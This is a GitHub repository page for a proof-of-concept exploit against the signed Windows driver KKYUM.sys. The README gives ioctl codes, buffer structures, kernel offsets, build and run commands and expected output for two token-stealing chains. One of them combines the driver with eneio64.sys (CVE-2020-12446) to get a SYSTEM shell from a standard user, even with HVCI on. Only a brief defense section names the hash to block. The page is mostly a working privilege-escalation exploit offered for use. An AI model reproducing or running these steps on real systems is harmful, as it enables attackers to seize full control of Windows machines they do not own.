# https://github.com/0xdeadbeefnetwork/KKYUMPoC

[Skip to content](https://github.com/0xdeadbeefnetwork/KKYUMPoC#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/0xdeadbeefnetwork/KKYUMPoC) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/0xdeadbeefnetwork/KKYUMPoC) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/0xdeadbeefnetwork/KKYUMPoC) to refresh your session.Dismiss alert

{{ message }}

main

[**1** Branch](https://github.com/0xdeadbeefnetwork/KKYUMPoC/branches) [**0** Tags](https://github.com/0xdeadbeefnetwork/KKYUMPoC/tags)

[Go to Branches page](https://github.com/0xdeadbeefnetwork/KKYUMPoC/branches)[Go to Tags page](https://github.com/0xdeadbeefnetwork/KKYUMPoC/tags)

Go to file

Code

Open more actions menu

## Latest commit

[![sickthecat](https://avatars.githubusercontent.com/u/129430216?v=4&size=40)](https://github.com/sickthecat)[sickthecat](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commits?author=sickthecat)

[chain\_exploit.c: fully unelevated via eneio64](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/6785e048f6f47734e200017a4b99c28029fed85b) [CVE-2020-12446](https://github.com/advisories/GHSA-xjhp-97gh-h5mv "CVE-2020-12446") [\+ KKYUM](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/6785e048f6f47734e200017a4b99c28029fed85b)

2 months agoAug 17, 2026

[6785e04](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/6785e048f6f47734e200017a4b99c28029fed85b) · 2 months agoAug 17, 2026

## History

[2 Commits](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commits/main/)

Open commit details

[View commit history for this file.](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commits/main/) 2 Commits

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| [ANALYSIS.md](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/ANALYSIS.md "ANALYSIS.md") | [ANALYSIS.md](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/ANALYSIS.md "ANALYSIS.md") | [KKYUM.sys PoC](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/88494cd8431fbf6f6b718f5b5ca1359f8b7a80c9 "KKYUM.sys PoC") | 2 months agoAug 16, 2026 |
| [README.md](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/README.md "README.md") | [README.md](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/README.md "README.md") | [chain\_exploit.c: fully unelevated via eneio64](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/6785e048f6f47734e200017a4b99c28029fed85b "chain_exploit.c: fully unelevated via eneio64 CVE-2020-12446 + KKYUM") [CVE-2020-12446](https://github.com/advisories/GHSA-xjhp-97gh-h5mv "CVE-2020-12446") [\+ KKYUM](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/6785e048f6f47734e200017a4b99c28029fed85b "chain_exploit.c: fully unelevated via eneio64 CVE-2020-12446 + KKYUM") | 2 months agoAug 17, 2026 |
| [chain\_exploit.c](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/chain_exploit.c "chain_exploit.c") | [chain\_exploit.c](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/chain_exploit.c "chain_exploit.c") | [chain\_exploit.c: fully unelevated via eneio64](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/6785e048f6f47734e200017a4b99c28029fed85b "chain_exploit.c: fully unelevated via eneio64 CVE-2020-12446 + KKYUM") [CVE-2020-12446](https://github.com/advisories/GHSA-xjhp-97gh-h5mv "CVE-2020-12446") [\+ KKYUM](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/6785e048f6f47734e200017a4b99c28029fed85b "chain_exploit.c: fully unelevated via eneio64 CVE-2020-12446 + KKYUM") | 2 months agoAug 17, 2026 |
| [pwn.c](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/pwn.c "pwn.c") | [pwn.c](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/pwn.c "pwn.c") | [KKYUM.sys PoC](https://github.com/0xdeadbeefnetwork/KKYUMPoC/commit/88494cd8431fbf6f6b718f5b5ca1359f8b7a80c9 "KKYUM.sys PoC") | 2 months agoAug 16, 2026 |
| View all files |

## Repository files navigation

# KKYUMPoC

[Permalink: KKYUMPoC](https://github.com/0xdeadbeefnetwork/KKYUMPoC#kkyumpoc)

```
 _._     _,-'""`-._
(,-.`._,'(       |\`-/|
    `-.-' \ )-`( , o o)
          `-    \`_`"'-   _SiCk // afflicted.sh
```

PoC and driver analysis for **KKYUM.sys**, a WHQL-signed cheat driver
(LOLDrivers PR #405, sha256
`72bd55f4459c992b9caa1a33cb6862f1f3085ca35839c58dee8b75db22ca605f`,
26,768 bytes, WHQL-attestation signed). The leaf signer is the uniform
`CN=Microsoft Windows Hardware Compatibility Publisher` (via
`Microsoft Windows Third Party Component CA 2012`) that every
attestation-signed driver carries — **the vendor identity is not recoverable**
**from the artifact**. Version resource is stripped; the only fingerprint
present is `PDBPath: E:\Windows\Desktop\Dev\Driver\IOBase\kmumd\Release\ioctl-km.pdb`.

The driver exposes `\\.\KKYUM` with no meaningful ACL and wraps
`MmCopyVirtualMemory` behind two ioctls that take a **caller-supplied PID**:
arbitrary cross-process read/write, kernel VAs included, from a standard
user token. The device resolves `PsLookupProcessByProcessId(pid)` per call
and never checks who's asking.

```
#define IOCTL_READ  0x22265c
#define IOCTL_WRITE 0x222658

// in/out buffer layout, both directions:
typedef struct {
    uint32_t pid;                 // target process, any pid incl 4
    uint32_t count;               // op count
    struct {
        uint64_t remote;          // VA in target process (kernel VA ok)
        uint64_t local;           // VA in your process
        uint64_t size;
    } ops[1];
} REQ;
```

## the PoC (pwn.c)

[Permalink: the PoC (pwn.c)](https://github.com/0xdeadbeefnetwork/KKYUMPoC#the-poc-pwnc)

Elevated token-steal, 126 lines, HVCI-compatible (data-only):

1. `AdjustTokenPrivileges(SeDebugPrivilege, ENABLED)` — required. the
SystemModuleInformation scrub gate checks **enabled**, not held. a stock
admin cmd holds it disabled and QSI(11) returns zeroed ImageBase.
2. `NtQuerySystemInformation(SystemModuleInformation)` -\> ntoskrnl base.
3. Walk ntoskrnl exports -> `PsInitialSystemProcess` -\> System EPROCESS.
4. Walk `ActiveProcessLinks` until pid matches ours.
5. Copy System's token over ours. Verify. Spawn `cmd /k whoami` (SYSTEM).
6. Restore original token after 2s.

Offsets (Windows 11 26100 / 26200):

```
UniqueProcessId     0x1d0
ActiveProcessLinks  0x1d8
Token               0x248
```

## build

[Permalink: build](https://github.com/0xdeadbeefnetwork/KKYUMPoC#build)

```
x86_64-w64-mingw32-gcc -s -O2 -o pwn.exe pwn.c
```

## run

[Permalink: run](https://github.com/0xdeadbeefnetwork/KKYUMPoC#run)

Load the driver once from an elevated cmd (driver not bundled in this repo —
pull from LOLDrivers PR #405):

```
sc create KKYUM binPath= C:\path\to\KKYUM.sys type= kernel
sc start KKYUM
```

then from the same elevated cmd:

```
pwn.exe
```

Expected:

```
[*] KKYUM.sys LPE
[+] nt fffff807bf800000
[+] dev
[+] sysEproc ffffbb8fc44c5040
[+] pid 2552 eproc ffffbb800aff2080 tok ffffaa086420263f -> ffffaa07fb27d93f
[+] SYSTEM shell (pid 26644)
[+] restored
```

Verified on Windows 11 26200 with VBS off (VM) and with HVCI on
(bare metal). pwn.exe also auto-starts the service if it finds it stopped.

## full ioctl map

[Permalink: full ioctl map](https://github.com/0xdeadbeefnetwork/KKYUMPoC#full-ioctl-map)

see [ANALYSIS.md](https://github.com/0xdeadbeefnetwork/KKYUMPoC/blob/main/ANALYSIS.md). summary:

```
0x222658  WRITE {pid, count, ops[{remote, local, size}]}   MmCopyVirtualMemory
0x22265C  READ  same layout, direction flipped
0x222650  module base {pid, name} -> DllBase, PEB->Ldr walk, out @ +520
0x222654  image name -> pid, kernel-side QSI walk, out @ +512
0x22261C  DKOM link, objects via win32kbase!ValidateHwnd, +88/+96
0x222620  DKOM unlink (window hiding)
0x222624  win32kfull call-site with attacker-controlled RDX
0x222640  set XOR key for subsequent ioctl buffers
0x222644  kbdclass/mouclass queue scanner init
0x222648  cursor sprite patch
0x22264C  cursor sprite patch (variant)
0x222662  READ, MDL variant (same MmCopyVirtualMemory)
0x222666  WRITE, MDL variant
```

Import table is ntoskrnl + the WDF loader stub only. No NDIS/WSK/file/registry
imports — the driver has no C2 or exfiltration capability; if the parent cheat
phones home, the user-mode client does it.

## chain\_exploit.c — fully unelevated (no SeDebug, no admin)

[Permalink: chain_exploit.c — fully unelevated (no SeDebug, no admin)](https://github.com/0xdeadbeefnetwork/KKYUMPoC#chain_exploitc--fully-unelevated-no-sedebug-no-admin)

`chain_exploit.c` chains a second vulnerable driver, **eneio64.sys**
(CVE-2020-12446, discovered by [@ihack4falafel](https://github.com/ihack4falafel),
exploit technique by [@Xacone](https://github.com/Xacone/Eneio64-Driver-Exploits),
sha256 `38c18db050b0b2b07f657c03db1c9595febae0319c746c3eede677e21cd238b0`,
WHQL-signed via ASUSTeK / ENE Technology, [LOLDrivers entry](https://www.loldrivers.io/drivers/90ecbbf7-b02f-424d-8b7d-56cc9e3b5873/)).
eneio64 maps **all physical memory** into the calling process via `\\.\GLCKIo`
(IOCTL `0x80102040`), from a standard user token, in one call. The entry-point
scan in the low 1MB of physical memory kills KASLR without asking Windows
anything — no API, no scrub layer, no decoy possible.

Both drivers load under HVCI with no test mode. Neither is in Microsoft's
vulnerable driver blocklist (verified against the local `driversipolicy.p7b`
and `VbsSiPolicy.p7b` — hash bytes, filenames, and signer names all absent).

Chain:

1. Open `\\.\GLCKIo` and `\\.\KKYUM` — both from a standard user token
2. eneio64 maps all 17.5 GB of physical memory into the process
3. Load `ntoskrnl.exe` file image locally, read the entry point RVA
4. Scan the low stub (first 1 MB of physical) for a live kernel pointer
to that entry — base = pointer − RVA (the Xacone method)
5. KKYUM reads the export table at that kernel VA → `PsInitialSystemProcess`
6. Walk `ActiveProcessLinks` to our EPROCESS, swap System's token over ours
7. Spawn `cmd /k whoami` — **`nt authority\system` from zero privileges**
8. Restore token after 2s

```
[*] running as x (elevated=0) - it doesn't matter
[+] both devices open, standard token [x, elevated=0]
[*] ntoskrnl entry point b4d3e0
[*] mapped 44963dfff bytes at 000001D736020000
[*] found entry ptr fffff805b4dfd3e0 -> base fffff805b42b0000
[+] nt base fffff805b42b0000
[+] sysEproc ffffd387356cf040 - Mew
[+] pid 9716 eprocess -> ffffd38745c9d080 - Mew
[+] tok ffff950d1959d066 -> ffff950d0d2894f5 - Meow
[+] SYSTEM cmd [pid 4008].
[+] Token restored! <3.
[*] Pop goes the shell.
```

Build:

```
x86_64-w64-mingw32-gcc -s -O2 -o chain_exploit.exe chain_exploit.c
```

Run (load both drivers once from admin, then normal cmd):

```
sc create KKYUM type= kernel binPath= C:\Windows\Temp\KKYUM.sys && sc start KKYUM
sc create eneio64 type= kernel binPath= C:\Windows\Temp\eneio64.sys && sc start eneio64
chain_exploit.exe
```

On 26100/26200 every classic unelevated kernel-address disclosure is closed
against a standard user token:

- QSI 0x11 module info / 0x40 handle table / 0x39 thread fields: scrubbed
- QSI 0x42 big pool: tags+sizes real, address field reduced to a 0/1 flag
- TEBs: sanitized
- desktop heap user alias: relative offsets, no raw kernel pointers
- System (pid 4) `PEB->Ldr` is NULL — the module-lookup ioctl leaks nothing

and the last fixed-address fallback is a trap: ring-3 `sidt` on 26200 returns
a decoy IDT base (`0xFFFFF80000001000`, unmapped) — reading it through the
driver is a guaranteed `PAGE_FAULT_IN_NONPAGED_AREA` bugcheck. Verified on
both a VMware guest (VBS off) and bare metal under Hyper-V (HVCI on), same
faulting address on both. Control read through the same primitive
(`0xFFFFF78000000000`, kernel view of KUSER\_SHARED\_DATA) returns real bytes,
so the primitive is fine — the address isn't.

Full writeup, including the four bluescreens and the sidt post-mortem:
[https://afflicted.sh/blog/posts/kkyum-leak-graveyard.html](https://afflicted.sh/blog/posts/kkyum-leak-graveyard.html)

## defense

[Permalink: defense](https://github.com/0xdeadbeefnetwork/KKYUMPoC#defense)

Block by hash `72bd55f4459c992b9caa1a33cb6862f1f3085ca35839c58dee8b75db22ca605f`
(Microsoft vulnerable driver blocklist entry pending at time of writing) and
revoke trust in the signing identity if you're in a position to.

lab use only. point it at machines you own.

\_SiCk · [afflicted.sh](https://afflicted.sh/)

## About

No description, website, or topics provided.

### Resources

[Readme](https://github.com/0xdeadbeefnetwork/KKYUMPoC#readme-ov-file)

[Activity](https://github.com/0xdeadbeefnetwork/KKYUMPoC/activity)

### Stars

**18** stars

### Watchers

**0** watching

### Forks

[**3** forks](https://github.com/0xdeadbeefnetwork/KKYUMPoC/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2F0xdeadbeefnetwork%2FKKYUMPoC&report=0xdeadbeefnetwork+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.